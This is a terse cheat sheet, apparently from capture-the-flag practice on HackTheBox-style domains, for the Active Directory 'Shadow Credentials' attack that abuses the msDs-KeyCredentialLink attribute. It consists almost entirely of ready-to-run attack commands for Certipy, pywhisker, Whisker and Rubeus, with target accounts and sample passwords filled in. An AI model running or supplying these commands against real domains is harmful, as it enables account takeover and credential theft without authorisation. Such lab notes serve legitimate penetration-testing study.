- [ ] msDs-KeyCredentialLink
- [ ] Linux | Certipy
- [ ] Linux | Pywhisker
- [ ] Windows | Wishker

msDs-KeyCredentialLink!!!
```

```
Linux | Certipy!!!
```sh
certipy shadow auto -username btables@outdated.htb -p '' -account sflowers -target DC.outdated.htb
```
Linux | Pywhisker!!!
```sh
pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
```
Windows | Wishker!!!
```powershell
.\Whisker.exe add /target:sflowers

.\Rubeus.exe asktgt /user:sflowers /certificate:'base64' /password:"KdYnd67XYSrlTsec" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /nowrap
```